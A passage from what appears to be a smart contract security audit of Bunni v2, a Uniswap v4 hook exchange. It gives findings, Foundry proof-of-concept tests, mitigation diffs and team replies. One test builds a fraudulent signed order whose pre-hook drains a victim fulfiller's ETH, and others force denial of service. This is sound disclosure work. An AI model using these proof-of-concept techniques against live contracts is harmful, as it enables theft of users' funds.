            data: abi.encodeWithSelector(IFulfiller.sourceConsideration.selector, bytes28(keccak256("IFulfiller.sourceConsideration")), maliciousOrder, address(0), bytes(""))
        });

        // Construct the fraudulent order.
        IFloodPlain.Order memory order = IFloodPlain.Order({
            offerer: address(account0.addr),
            zone: address(0),
            recipient: account0.addr,
            offer: offer,
            consideration: consideration,
            deadline: type(uint256).max,
            nonce: 0,
            preHooks: preHooks,
            postHooks: new IFloodPlain.Hook[](0)
        });

        // Sign the order.
        bytes memory sig = getSignature(order, account0);

        IFloodPlain.SignedOrder memory signedOrder = IFloodPlain.SignedOrder({order: order, signature: sig});

        deal(address(token1), address(this), 500);
        token1.approve(address(book), 500);

        // Filling order succeeds and pre hook call invoked sourceConsideration on the vitim fulfiller.
        book.fulfillOrder(signedOrder);
        assertEq(address(victimFulfiller).balance, 0);
    }
}
```

**Recommended Mitigation:** Following the [recent acquisition](https://0x.org/post/0x-acquires-flood-to-optimize-trade-execution) of Flood.bid by 0x, it appears that these contracts are no longer maintained. Therefore, without requiring an upstream change, this issue can be mitigated by always validating the `selectorExtension` argument is equal to the `SELECTOR_EXTENSION` constant in the implementation of both `IFulfiller::sourceConsideration` and `IFulfiller::sourceConsiderations`.

**0x:**
The actual value of `SELECTOR_EXTENSION` is unfortunate but the intent of the code is respected and safe, and its expected for Fulfillers to be the "expert" actors in the system and handle their security well.

**Bacon Labs:** Acknowledged and will fix this later in our rebalancer contract. Realistically theres currently no impact since our rebalancer does not hold any inventory other than during the execution of an order.

**Cyfrin:** Acknowledged.

\clearpage
## Medium Risk


### Hooklet token transfer hooks will reference the incorrect sender due to missing use of `LibMulticaller.senderOrSigner()`

**Description:** `LibMulticaller` is used throughout the codebase to retrieve the actual sender of multicall transactions; however, `BunniToken::_beforeTokenTransfer` and `BunniToken::_afterTokenTransfer` both incorrectly pass `msg.sender` directly to the corresponding Hooklet function:

```solidity
function _beforeTokenTransfer(address from, address to, uint256 amount, address newReferrer) internal override {
    IHooklet hooklet_ = hooklet();
    if (hooklet_.hasPermission(HookletLib.BEFORE_TRANSFER_FLAG)) {
        hooklet_.hookletBeforeTransfer(msg.sender, poolKey(), this, from, to, amount);
    }
}

function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
    // call hooklet
    IHooklet hooklet_ = hooklet();
    if (hooklet_.hasPermission(HookletLib.AFTER_TRANSFER_FLAG)) {
        hooklet_.hookletAfterTransfer(msg.sender, poolKey(), this, from, to, amount);
    }
}
```

**Impact:** The Hooklet calls will reference the incorrect sender. This has potentially serious downstream effects for integrators as custom logic is executed with the incorrect address in multicall transactions.

**Recommended Mitigation:** `LibMulticaller.senderOrSigner()` should be used in place of `msg.sender` wherever the actual sender is required:

```diff
function _beforeTokenTransfer(address from, address to, uint256 amount, address newReferrer) internal override {
    IHooklet hooklet_ = hooklet();
    if (hooklet_.hasPermission(HookletLib.BEFORE_TRANSFER_FLAG)) {
--      hooklet_.hookletBeforeTransfer(msg.sender, poolKey(), this, from, to, amount);
++      hooklet_.hookletBeforeTransfer(LibMulticaller.senderOrSigner(), poolKey(), this, from, to, amount);
    }
}

function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
    // call hooklet
    IHooklet hooklet_ = hooklet();
    if (hooklet_.hasPermission(HookletLib.AFTER_TRANSFER_FLAG)) {
--      hooklet_.hookletAfterTransfer(msg.sender, poolKey(), this, from, to, amount);
++      hooklet_.hookletAfterTransfer(LibMulticaller.senderOrSigner(), poolKey(), this, from, to, amount);
    }
}
```

**Bacon Labs:** Fixed in [PR \#106](https://github.com/timeless-fi/bunni-v2/pull/106).

**Cyfrin:** Verified, the `LibMulticaller` is now used to pass the `msg.sender` in `BunniToken` Hooklet calls.


### Broken block time assumptions affect am-AMM epoch duration and can DoS rebalancing on Arbitrum

**Description:** `AmAmm` defines the following virtual function which specifies the auction delay parameter in blocks:

```solidity
function K(PoolId) internal view virtual returns (uint48) {
    return 7200;
}
```

Here, `7200` assumes a 12s Ethereum mainnet block time. This corresponds to 24-hour epochs and is the intended duration for all chains. Given that different chains have different block times, this function is overridden in `BunniHook` to return the value of the immutable parameter `_K`:

```solidity
uint48 internal immutable _K;

function K(PoolId) internal view virtual override returns (uint48) {
    return _K;
}
```

The values used on each chain can be seen in `.env.example`:

```env
# Mainnet
AMAMM_K_1=7200

# Arbitrum
AMAMM_K_42161=345600

# Base
AMAMM_K_8453=43200

# Unichain
AMAMM_K_130=86400
```

However, there are multiple issues with this configuration.

Firstly, while the value of the `_K` parameter on Base currently correctly assumes a 2s block time, this value can and will change, with a decrease to 0.2s block times [expected later this year](https://www.theblock.co/post/343908/base-cuts-block-times-to-0-2-seconds-on-testnet-with-flashblocks-mainnet-rollout-expected-in-q2). While not overly frequent, a reduction in block times is commonplace and should be expected, for example Ethereum's reduction in average block time from 13s to 12s when transitioning to Proof of Stake and Arbitrum's reduction from 2s to 0.25s (configurable further still to 0.1s on select Arbitrum chains). Thus, `_K` should not be immutable but rather configurable by the contract admin across all chains.

Secondly, while the value of the `_K` parameter on Arbitrum is correct for the assumed default 0.25s block time, the L2 block number is not used in the logic as `block.number` incorrectly [references the L1 ancestor block](https://docs.arbitrum.io/build-decentralized-apps/arbitrum-vs-ethereum/block-numbers-and-time) instead. As a result, the epoch duration on Arbitrum is significantly longer than expected at 1152 hours (48 days) which for enabled hooks will cause significant disruption to both the functioning of LVR auctions and its bidders. This is not the case for OP Stack chains, such as Base & Unichain, which return the L2 block number when using `block.number` directly.

An additional implication of the incorrect Arbitrum `block.number` assumption lies in its usage in `RebalanceLogic` when creating a rebalance order:

```solidity
IFloodPlain.Order memory order = IFloodPlain.Order({
    offerer: address(this),
    zone: address(env.floodZone),
    recipient: address(this),
    offer: offer,
    consideration: consideration,
    deadline: block.timestamp + rebalanceOrderTTL,
    nonce: uint256(keccak256(abi.encode(block.number, id))), // combine block.number and pool id to avoid nonce collisions between pools
    preHooks: preHooks,
    postHooks: postHooks
});
```

As stated by the inline comment, the block number is hashed with the pool id to prevent nonce collisions between pools whereby the creation of a rebalance order for a given pool in a given block would prevent the creation of such orders for other pools if only the block number was used. This logic works well for most chains, allowing for the creation of a single rebalance order per block per pool; however, by inadvertently referencing L1 block numbers on Arbitrum, this logic will continue to cause DoS issues in Permit2 for a given pool id with the same nonce. The Arbitrum L2 block may have advanced and require additional rebalancing, but the attempted order is very likely to reference the same L1 ancestor block given there are roughly 48 L2 blocks created in the time it takes one L1 block to be created.

**Impact:** Improper handling of the Arbitrum L2 block number results in denial-of-service of the Bunni Hook both in am-AMM functionality and rebalance orders.

**Recommended Mitigation:** * Allow the `_K` parameter to be configurable by the contract admin across all chains to adapt to changes in block time.
* Use the ArbSys L2 block number precompile to correctly reference the L2 block.

**Bacon Labs:** Fixed in [PR \#99](https://github.com/timeless-fi/bunni-v2/pull/99) and [`PR [*Token transfer hooks should be invoked at the end of execution to prevent the hooklet executing over intermediate state*](#token-transfer-hooks-should-be-invoked-at-the-end-of-execution-to-prevent-the-hooklet-executing-over-intermediate-state)`](https://github.com/Bunniapp/biddog/pull/6).

**Cyfrin:** Verified, the rebalance order and base `AmAmm` implementation both now query the ArbSys precompile to return the correct Arbitrum block number. Logic to schedule K change has also been added. Currently, the owner can simply schedule the change to become active in the current block which will update K instantaneously without any time delay. It is instead recommended to validate the active block to be in an acceptable range future blocks, setting a minimum number of blocks such that there is some time delay between the change and new K activation. Additionally, the owner can decrease the active block of a pending K which should not be allowed either. For example, if they scheduled a new K to become active in block 100, they can schedule the same K with an active block of 50 and it will be overridden.

**Bacon Labs:** This behavior is intentional. Being able to update K instantly is needed in case a chain doesnt pre-announce the block time update and just do it. Being able to override the active block is also needed in case a chain changes the schedule for the block time update.

**Cyfrin:** Acknowedged.


### DoS of Bunni pools when raw balance is outside limits but vaults do not accept additional deposits

**Description:** When the `BunniHub` has a `rawBalance` that exceeds `maxRawTokenRatio` it will attempt to make a deposit into the corresponding vault to reach the `targetRawTokenRatio`. To do so, the `_updateRawBalanceIfNeeded()` function is called which in turn calls `_updateVaultReserveViaClaimTokens()`:

```solidity
    function _updateRawBalanceIfNeeded(
        Currency currency,
        ERC4626 vault,
        uint256 rawBalance,
        uint256 reserve,
        uint256 minRatio,
        uint256 maxRatio,
        uint256 targetRatio
    ) internal returns (uint256 newReserve, uint256 newRawBalance) {
        uint256 balance = rawBalance + getReservesInUnderlying(reserve, vault);
        uint256 minRawBalance = balance.mulDiv(minRatio, RAW_TOKEN_RATIO_BASE);
        uint256 maxRawBalance = balance.mulDiv(maxRatio, RAW_TOKEN_RATIO_BASE);

        if (rawBalance < minRawBalance || rawBalance > maxRawBalance) {
            uint256 targetRawBalance = balance.mulDiv(targetRatio, RAW_TOKEN_RATIO_BASE);
            (int256 reserveChange, int256 rawBalanceChange) =
@>              _updateVaultReserveViaClaimTokens(targetRawBalance.toInt256() - rawBalance.toInt256(), currency, vault);
            newReserve = _updateBalance(reserve, reserveChange);
            newRawBalance = _updateBalance(rawBalance, rawBalanceChange);
        } else {
            (newReserve, newRawBalance) = (reserve, rawBalance);
        }
    }

    function _updateVaultReserveViaClaimTokens(int256 rawBalanceChange, Currency currency, ERC4626 vault)
        internal
        returns (int256 reserveChange, int256 actualRawBalanceChange)
    {
        uint256 absAmount = FixedPointMathLib.abs(rawBalanceChange);
        if (rawBalanceChange < 0) {
            uint256 maxDepositAmount = vault.maxDeposit(address(this));
            // if poolManager doesn't have enough tokens or we're trying to deposit more than the vault accepts
            // then we only deposit what we can
            // we're only maintaining the raw balance ratio so it's fine to deposit less than requested
            uint256 poolManagerReserve = currency.balanceOf(address(poolManager));
            absAmount = FixedPointMathLib.min(FixedPointMathLib.min(absAmount, maxDepositAmount), poolManagerReserve);

            // burn claim tokens from this
            poolManager.burn(address(this), currency.toId(), absAmount);

            // take tokens from poolManager
            poolManager.take(currency, address(this), absAmount);

            // deposit tokens into vault
            IERC20 token;
            if (currency.isAddressZero()) {
                // wrap ETH
                weth.deposit{value: absAmount}();
                token = IERC20(address(weth));
            } else {
                token = IERC20(Currency.unwrap(currency));
            }
            address(token).safeApproveWithRetry(address(vault), absAmount);
            // @audit this will fail for tokens that revert on 0 token transfers or ERC4626 vaults that does not allow 0 asset deposits
@>          reserveChange = vault.deposit(absAmount, address(this)).toInt256();

            // it's safe to use absAmount here since at worst the vault.deposit() call pulled less token
            // than requested
            actualRawBalanceChange = -absAmount.toInt256();

            // revoke token approval to vault if necessary
            if (token.allowance(address(this), address(vault)) != 0) {
                address(token).safeApprove(address(vault), 0);
            }
        } else if (rawBalanceChange > 0) {
            ...
        }
    }
```

When attempting a deposit of raw balance into the vault, the minimum is computed between the amount intended to be deposited, the max deposit returned by the vault, and the Uniswap v4 Pool Manager reserve. When the ERC-4626 vault reaches a maximum amount of assets deposited and returns zero assets, the amount to deposit into the vault will be zero. This can be problematic for multiple reasons:
1. There are vaults that do not allow zero asset deposits.
2. There are vault that revert upon minting zero shares.
3. There are tokens that revert upon zero transfers.

This results in DoS when the raw balance is too high as an attempt will be made to deposit zero assets into the vault which will revert. Instead, the logic should avoid calling the deposit function when the amount to deposit is zero as is done in the `_depositVaultReserve()` function.

```solidity
if (address(state.vault0) != address(0) && reserveAmount0 != 0) {
    (uint256 reserveChange, uint256 reserveChangeInUnderlying, uint256 amountSpent) = _depositVaultReserve(
        env, reserveAmount0, params.poolKey.currency0, state.vault0, msgSender, params.vaultFee0
    );
    s.reserve0[poolId] = state.reserve0 + reserveChange;

    // use actual withdrawable value to handle vaults with withdrawal fees
    reserveAmount0 = reserveChangeInUnderlying;

    // add amount spent on vault deposit to the total amount spent
    amount0Spent += amountSpent;
}
```

The `reserveAmount0` is the amount computed to be deposited into the vault, so when it is zero the deposit execution is ignored.

**Proof of Concept:** Modify the `ERC4626Mock` to simulate an ERC-4626 vault that has reached its asset limit, returning zero when `maxDeposit()` is queried, and also revert upon attempting to deposit zero assets:

```solidity
contract ERC4626Mock is ERC4626 {
    address internal immutable _asset;
    mapping(address to => bool maxDepostitCapped) internal maxDepositsCapped;
    error ZeroAssetsDeposit();

    constructor(IERC20 asset_) {
        _asset = address(asset_);
    }

    function deposit(uint256 assets, address to) public override returns (uint256 shares) {
        if(assets == 0) revert ZeroAssetsDeposit();
        return super.deposit(assets, to);
    }

    function setMaxDepositFor(address to) external {
        maxDepositsCapped[to] = true;
    }

    function maxDeposit(address to) public view override returns (uint256 maxAssets) {
        if(maxDepositsCapped[to]){
            return 0;
        } else {
            return super.maxDeposit(to);
        }
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }
}
```

The following test can now be placed within `BunniHook.t.sol`:

```solidity
function test_PoCVaultDoS() public {
    Currency currency0 = Currency.wrap(address(token0));
    Currency currency1 = Currency.wrap(address(token1));
    ERC4626 vault0_ = vault0;
    ERC4626 vault1_ = vault1;

    (, PoolKey memory key) = _deployPoolAndInitLiquidity(currency0, currency1, vault0_, vault1_);

    uint256 inputAmount = PRECISION / 10;

    _mint(key.currency0, address(this), inputAmount);
    uint256 value = key.currency0.isAddressZero() ? inputAmount : 0;

    IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
        zeroForOne: true,
        amountSpecified: -int256(inputAmount),
        sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(3)
    });

    // Set up conditions
    // 1. Ensure that raw balance is greater than the max, hence it would need to trigger the vault
    // deposit
    uint256 amountOfAssetsToBurn = vault0.balanceOf(address(hub)) / 3;
    vm.prank(address(hub));
    vault0.transfer(address(0xdead), amountOfAssetsToBurn);
    // 2. Ensure maxDeposit is 0
    vault0.setMaxDepositFor(address(hub));

    vm.expectRevert(
        abi.encodeWithSelector(
            WrappedError.selector,
            address(bunniHook),
            BunniHook.beforeSwap.selector,
            abi.encodePacked(ERC4626Mock.ZeroAssetsDeposit.selector),
            abi.encodePacked(bytes4(keccak256("HookCallFailed()")))
        )
    );
    _swap(key, params, value, "swap");
}
```

Revert due to the `ZeroAssetsDeposit()` custom error set up in the ERC-4626 vault can be observed to be wrapped in the Uniswap v4 `WrappedError()`.

**Impact:** The Bunni pool will enter a state of denial-of-service for swaps and rebalancing until the vault accepts more deposits.

**Recommended Mitigation:** If the amount to deposit is zero, ignore the deposit execution:

```diff
function _updateVaultReserveViaClaimTokens(int256 rawBalanceChange, Currency currency, ERC4626 vault)
        internal
        returns (int256 reserveChange, int256 actualRawBalanceChange)
    {
        uint256 absAmount = FixedPointMathLib.abs(rawBalanceChange);
        if (rawBalanceChange < 0) {
            uint256 maxDepositAmount = vault.maxDeposit(address(this));
            // if poolManager doesn't have enough tokens or we're trying to deposit more than the vault accepts
            // then we only deposit what we can
            // we're only maintaining the raw balance ratio so it's fine to deposit less than requested
            uint256 poolManagerReserve = currency.balanceOf(address(poolManager));
            absAmount = FixedPointMathLib.min(FixedPointMathLib.min(absAmount, maxDepositAmount), poolManagerReserve);

++          if(absAmount == 0) return(0, 0);

            // burn claim tokens from this
            poolManager.burn(address(this), currency.toId(), absAmount);

            // take tokens from poolManager
            poolManager.take(currency, address(this), absAmount);

            // deposit tokens into vault
            IERC20 token;
            if (currency.isAddressZero()) {
                // wrap ETH
                weth.deposit{value: absAmount}();
                token = IERC20(address(weth));
            } else {
                token = IERC20(Currency.unwrap(currency));
            }
            address(token).safeApproveWithRetry(address(vault), absAmount);
            reserveChange = vault.deposit(absAmount, address(this)).toInt256();

            // it's safe to use absAmount here since at worst the vault.deposit() call pulled less token
            // than requested
            actualRawBalanceChange = -absAmount.toInt256();

            // revoke token approval to vault if necessary
            if (token.allowance(address(this), address(vault)) != 0) {
                address(token).safeApprove(address(vault), 0);
            }
        } else if (rawBalanceChange > 0) {
            ...
        }
    }
```

**Bacon Labs:** Fixed in [PR \#96](https://github.com/timeless-fi/bunni-v2/pull/96).

**Cyfrin:** Verified, the execution now returns early if it is not possible to make additional deposits.


### DoS of Bunni pools configured with dynamic LDFs due to insufficient validation of post-shift tick bounds

**Description:** Unlike in `LibUniformDistribution::decodeParams`, the min/max usable ticks are not validated by `UniformDistribution::query`. The maximum length of the liquidity position corresponds to $\text{tick} \in [minUsableTick, maxUsableTick]$, but if the invocation of `enforceShiftMode()` mode returns `lastTickLower` to account for an undesired shift direction then `tickUpper` can exceed `maxUsableTick` for a sufficiently large `tickLength`:

```solidity
function query(
    PoolKey calldata key,
    int24 roundedTick,
    int24 twapTick,
    int24, /* spotPriceTick */
    bytes32 ldfParams,
    bytes32 ldfState
)
    external
    view
    override
    guarded
    returns (
        uint256 liquidityDensityX96_,
        uint256 cumulativeAmount0DensityX96,
        uint256 cumulativeAmount1DensityX96,
        bytes32 newLdfState,
        bool shouldSurge
    )
{
    (int24 tickLower, int24 tickUpper, ShiftMode shiftMode) =
        LibUniformDistribution.decodeParams(twapTick, key.tickSpacing, ldfParams);
    (bool initialized, int24 lastTickLower) = _decodeState(ldfState);
    if (initialized) {
        int24 tickLength = tickUpper - tickLower;
        tickLower = enforceShiftMode(tickLower, lastTickLower, shiftMode);
@>      tickUpper = tickLower + tickLength;
        shouldSurge = tickLower != lastTickLower;
    }
     (liquidityDensityX96_, cumulativeAmount0DensityX96, cumulativeAmount1DensityX96) =
        LibUniformDistribution.query(roundedTick, key.tickSpacing, tickLower, tickUpper);
    newLdfState = _encodeState(tickLower);
}
```

While ticks are initially validated to be in the range of usable ticks, `tickUpper` is simply recomputed as `tickLower + tickLength`. If the `tickLength` and/or the shift enforced between `tickLower` and `lastTickLower` is sufficiently large then `tickUpper` could exceed the usable range, since `tickLower` is updated without also updating the corresponding `tickLength` when the shift condition is met to return the `lastTickLower`. This results in a revert with `InvalidTick()` as the upper tick exceeds `TickMath.MAX_TICK`.

Consider the following:
1. During initialization of the LDF with a dynamic shift mode, the very first `tickLower` is set to `minUsableTick + tickSpacing`. With the corresponding `tickUpper`, this distribution is bounded to be within the range of usable ticks.

```solidity
/// @return tickLower The lower tick of the distribution
/// @return tickUpper The upper tick of the distribution
function decodeParams(int24 twapTick, int24 tickSpacing, bytes32 ldfParams)
    internal
    pure
    returns (int24 tickLower, int24 tickUpper, ShiftMode shiftMode)
{
    shiftMode = ShiftMode(uint8(bytes1(ldfParams)));

    if (shiftMode != ShiftMode.STATIC) {
        // | shiftMode - 1 byte | offset - 3 bytes | length - 3 bytes |
        int24 offset = int24(uint24(bytes3(ldfParams << 8))); // offset of tickLower from the twap tick
        int24 length = int24(uint24(bytes3(ldfParams << 32))); // length of the position in rounded ticks
        tickLower = roundTickSingle(twapTick + offset, tickSpacing);
        tickUpper = tickLower + length * tickSpacing;

        // bound distribution to be within the range of usable ticks
        (int24 minUsableTick, int24 maxUsableTick) =
            (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
        if (tickLower < minUsableTick) {
            int24 tickLength = tickUpper - tickLower;
            tickLower = minUsableTick;
            tickUpper = int24(FixedPointMathLib.min(tickLower + tickLength, maxUsableTick));
        } else if (tickUpper > maxUsableTick) {
            int24 tickLength = tickUpper - tickLower;
            tickUpper = maxUsableTick;
            tickLower = int24(FixedPointMathLib.max(tickUpper - tickLength, minUsableTick));
        }
    } else {
        ...
    }
}
```

2. Even if the immutable length parameter of the distribution is encoded such that `upperTick` exceeds the `maxUsableTick` and is hence capped at `maxUsableTick`, note that it is simply only constrained by `isValidParams()` as `int256(length) * int256(tickSpacing) <= type(int24).max` which passes for a sufficiently small `tickSpacing`.
3. Assuming a shift mode of `RIGHT`, and a new `tickLower` of `minUsableTick`, `decodeParams()` would
 return `minUsableTick` and `maxUsableTick` since the encoded length is such that `tickUpper` exceeds the usable range. `tickLength` is therefore the entire usable range `maxUsableTick - minUsableTick`.
4. The shift is enforced such that `tickLower` is now `minUsableTick + tickSpacing` (`lastTickLower`)
and `tickUpper` is recomputed as `minUsableTick + tickSpacing + (maxUsableTick - minUsableTick = maxUsableTick + tickSpacing`. This exceeds the usable range and reverts as described.

```md
when validating params:
 minUsableTick          maxUsableTick
    |                          |
      |                           |
       ____________________________
              encoded length


when decoding params:
 minUsableTick      maxUsableTick
    |                      |
    |                      |
    ________________________
   tickLength = smallerLength


when enforcing shift mode:
      newTickLower  maxUsableTick
    |      |               |       |
            ________________________
                tickLength
```

While the addition of the below validation to `isValidParams()` would prevent issues caused by an improperly encoded length, it is not enough to avoid DoS by this vector. The lower/upper ticks should also be validated by `UniformDistribution::query` against the min/max usable ticks in a manner similar to `decodeParams()`.

```solidity
(int24 minUsableTick, int24 maxUsableTick) =
        (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
int256(length) * int256(tickSpacing) <= (maxUsableTick - minUsableTick)
```

**Impact:** While the likelihood of this issue is unclear, its impact is the DoS of all operations that depend on `queryLDF()`. Users would be unable to swap against the pool to return the tick to the usable range once it exceeds the max tick and shifts toward the mean tick would cause the pool to remain stuck outside the usable range.

**Proof of Concept:** The following test should be added to `UniformDistribution.t.sol`:

```solidity
function test_poc_shiftmode()
    external
    virtual
{
    int24 tickSpacing = MIN_TICK_SPACING;
    (int24 minUsableTick, int24 maxUsableTick) =
        (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
    int24 tickLower = minUsableTick;
    int24 tickUpper = maxUsableTick;
    int24 length = (tickUpper - minUsableTick) / tickSpacing;
    int24 currentTick = minUsableTick + tickSpacing * 2;
    int24 offset = roundTickSingle(tickLower - currentTick, tickSpacing);
    assertTrue(offset % tickSpacing == 0, "offset not divisible by tickSpacing");

    console2.log("tickSpacing", tickSpacing);
    console2.log("tickLower", tickLower);
    console2.log("tickUpper", tickUpper);
    console2.log("length", length);
    console2.log("currentTick", currentTick);
    console2.log("offset", offset);

    PoolKey memory key;
    key.tickSpacing = tickSpacing;
    bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.RIGHT, offset, length));
    assertTrue(ldf.isValidParams(key, 15 minutes, ldfParams));

    bytes32 INITIALIZED_STATE = bytes32(abi.encodePacked(true, currentTick));
    int24 roundedTick = roundTickSingle(currentTick, tickSpacing);
    vm.expectPartialRevert(0x8b86327a);
    (, uint256 cumulativeAmount0DensityX96, uint256 cumulativeAmount1DensityX96,,) =
        ldf.query(key, roundedTick, 0, currentTick, ldfParams, INITIALIZED_STATE);
}
```

**Recommended Mitigation:** Additional validation should be performed on the distribution length and also to cap the upper tick after enforcing the shift. The lower tick could also be re-validated to be extra safe in case it is somehow possible to get the last tick outside the usable range. The absence of dynamic LDF tests was also noted and should be included to improve coverage.

```diff
function isValidParams(int24 tickSpacing, uint24 twapSecondsAgo, bytes32 ldfParams) internal pure returns (bool) {
    uint8 shiftMode = uint8(bytes1(ldfParams)); // use uint8 since we don't know if the value is in range yet
    if (shiftMode != uint8(ShiftMode.STATIC)) {
        // Shifting
        // | shiftMode - 1 byte | offset - 3 bytes | length - 3 bytes |
        int24 offset = int24(uint24(bytes3(ldfParams << 8))); // offset (in rounded ticks) of tickLower from the twap tick
        int24 length = int24(uint24(bytes3(ldfParams << 32))); // length of the position in rounded ticks

        return twapSecondsAgo != 0 && length > 0 && offset % tickSpacing == 0
++        && int256(length) * int256(tickSpacing) <= (TickMath.maxUsableTick(tickSpacing) - TickMath.minUsableTick(tickSpacing))
            && int256(length) * int256(tickSpacing) <= type(int24).max && shiftMode <= uint8(type(ShiftMode).max);
    } else {
        ...
}

function query(
    PoolKey calldata key,
    int24 roundedTick,
    int24 twapTick,
    int24, /* spotPriceTick */
    bytes32 ldfParams,
    bytes32 ldfState
)
    external
    view
    override
    guarded
    returns (
        uint256 liquidityDensityX96_,
        uint256 cumulativeAmount0DensityX96,
        uint256 cumulativeAmount1DensityX96,
        bytes32 newLdfState,
        bool shouldSurge
    )
{
    (int24 tickLower, int24 tickUpper, ShiftMode shiftMode) =
        LibUniformDistribution.decodeParams(twapTick, key.tickSpacing, ldfParams);
    (bool initialized, int24 lastTickLower) = _decodeState(ldfState);
    if (initialized) {
        int24 tickLength = tickUpper - tickLower;
--      tickLower = enforceShiftMode(tickLower, lastTickLower, shiftMode);
--      tickUpper = tickLower + tickLength;
++      tickLower = int24(FixedPointMathLib.max(minUsableTick, enforceShiftMode(tickLower, lastTickLower, shiftMode));
++      tickUpper = int24(FixedPointMathLib.min(maxUsableTick, tickLower + tickLength);
        shouldSurge = tickLower != lastTickLower;
    }

    (liquidityDensityX96_, cumulativeAmount0DensityX96, cumulativeAmount1DensityX96) =
        LibUniformDistribution.query(roundedTick, key.tickSpacing, tickLower, tickUpper);
    newLdfState = _encodeState(tickLower);
}
```

**Bacon Labs:** Fixed in [PR \#97](https://github.com/timeless-fi/bunni-v2/pull/97).

**Cyfrin:** Verified, `UniformDistribution` now correctly bounds the tick ranges by the minimum and maximum usable ticks.


### Various vault accounting inconsistencies and potential unhandled reverts

**Description:** `BunniHub::hookHandleSwap` overestimates the reserves deposited to ERC-4626 vaults and assumes that within the call to `_updateVaultReserveViaClaimTokens()` it deposits enough to execute the swap:

```solidity
    function hookHandleSwap(PoolKey calldata key, bool zeroForOne, uint256 inputAmount, uint256 outputAmount)
        external
        override
        nonReentrant
        notPaused(4)
    {
        if (msg.sender != address(key.hooks)) revert BunniHub__Unauthorized();

        // load state
        PoolId poolId = key.toId();
        PoolState memory state = getPoolState(s, poolId);
        (Currency inputToken, Currency outputToken) =
            zeroForOne ? (key.currency0, key.currency1) : (key.currency1, key.currency0);
        (uint256 initialReserve0, uint256 initialReserve1) = (state.reserve0, state.reserve1);

        // pull input claim tokens from hook
        if (inputAmount != 0) {
            zeroForOne ? state.rawBalance0 += inputAmount : state.rawBalance1 += inputAmount;
            poolManager.transferFrom(address(key.hooks), address(this), inputToken.toId(), inputAmount);
        }

        // push output claim tokens to hook
        if (outputAmount != 0) {
            (uint256 outputRawBalance, ERC4626 outputVault) =
                zeroForOne ? (state.rawBalance1, state.vault1) : (state.rawBalance0, state.vault0);
            if (address(outputVault) != address(0) && outputRawBalance < outputAmount) {
                // insufficient token balance
                // withdraw tokens from reserves
@>              (int256 reserveChange, int256 rawBalanceChange) = _updateVaultReserveViaClaimTokens(
                    (outputAmount - outputRawBalance).toInt256(), outputToken, outputVault
                );
                zeroForOne
                    ? (state.reserve1, state.rawBalance1) =
                        (_updateBalance(state.reserve1, reserveChange), _updateBalance(state.rawBalance1, rawBalanceChange))
                    : (state.reserve0, state.rawBalance0) =
                        (_updateBalance(state.reserve0, reserveChange), _updateBalance(state.rawBalance0, rawBalanceChange));
            }
@>          zeroForOne ? state.rawBalance1 -= outputAmount : state.rawBalance0 -= outputAmount;
            poolManager.transfer(address(key.hooks), outputToken.toId(), outputAmount);
        }
```

In the event the vault does not actually pull this amount of assets, it could cause raw balances to be considered smaller than they actually are:

```solidity
    function _updateVaultReserveViaClaimTokens(int256 rawBalanceChange, Currency currency, ERC4626 vault)
        internal
        returns (int256 reserveChange, int256 actualRawBalanceChange)
    {
        uint256 absAmount = FixedPointMathLib.abs(rawBalanceChange);
        if (rawBalanceChange < 0) {
            uint256 maxDepositAmount = vault.maxDeposit(address(this));
            // if poolManager doesn't have enough tokens or we're trying to deposit more than the vault accepts
            // then we only deposit what we can
            // we're only maintaining the raw balance ratio so it's fine to deposit less than requested
            uint256 poolManagerReserve = currency.balanceOf(address(poolManager));
            absAmount = FixedPointMathLib.min(FixedPointMathLib.min(absAmount, maxDepositAmount), poolManagerReserve);

            // burn claim tokens from this
            poolManager.burn(address(this), currency.toId(), absAmount);

            // take tokens from poolManager
            poolManager.take(currency, address(this), absAmount);

            // deposit tokens into vault
            IERC20 token;
            if (currency.isAddressZero()) {
                // wrap ETH
                weth.deposit{value: absAmount}();
                token = IERC20(address(weth));
            } else {
                token = IERC20(Currency.unwrap(currency));
            }
            address(token).safeApproveWithRetry(address(vault), absAmount);
            reserveChange = vault.deposit(absAmount, address(this)).toInt256();

            // it's safe to use absAmount here since at worst the vault.deposit() call pulled less token
            // than requested
@>          actualRawBalanceChange = -absAmount.toInt256();

            // revoke token approval to vault if necessary
            if (token.allowance(address(this), address(vault)) != 0) {
                address(token).safeApprove(address(vault), 0);
            }
        } else if (rawBalanceChange > 0) {
            ...
        }
    }
```

Similarly, when attempting to surge to the target raw balance ratio, it is not guaranteed that the vault withdraws sufficient reserves to reach the target raw balance bounds. `BunniHub::_updateRawBalanceIfNeeded` attempts to reach target but this is not guaranteed:

```solidity
  function _updateRawBalanceIfNeeded(
        Currency currency,
        ERC4626 vault,
        uint256 rawBalance,
        uint256 reserve,
        uint256 minRatio,
        uint256 maxRatio,
        uint256 targetRatio
    ) internal returns (uint256 newReserve, uint256 newRawBalance) {
        uint256 balance = rawBalance + getReservesInUnderlying(reserve, vault);
        uint256 minRawBalance = balance.mulDiv(minRatio, RAW_TOKEN_RATIO_BASE);
        uint256 maxRawBalance = balance.mulDiv(maxRatio, RAW_TOKEN_RATIO_BASE);

        if (rawBalance < minRawBalance || rawBalance > maxRawBalance) {
            uint256 targetRawBalance = balance.mulDiv(targetRatio, RAW_TOKEN_RATIO_BASE);
@>          (int256 reserveChange, int256 rawBalanceChange) =
                _updateVaultReserveViaClaimTokens(targetRawBalance.toInt256() - rawBalance.toInt256(), currency, vault);
            newReserve = _updateBalance(reserve, reserveChange);
            newRawBalance = _updateBalance(rawBalance, rawBalanceChange);
        } else {
            (newReserve, newRawBalance) = (reserve, rawBalance);
        }
    }
```

In this case, a vault accepting fewer assets than requested would result in an underestimate for the true raw balance. Assuming a deposit is successful but the actual amount pulled by the vault in `_depositVaultReserve()` is less than the `amountSpent`, this is the scenario that necessitates revocation of the token approval to the vault:

```solidity
// revoke token approval to vault if necessary
if (token.allowance(address(this), address(vault)) != 0) {
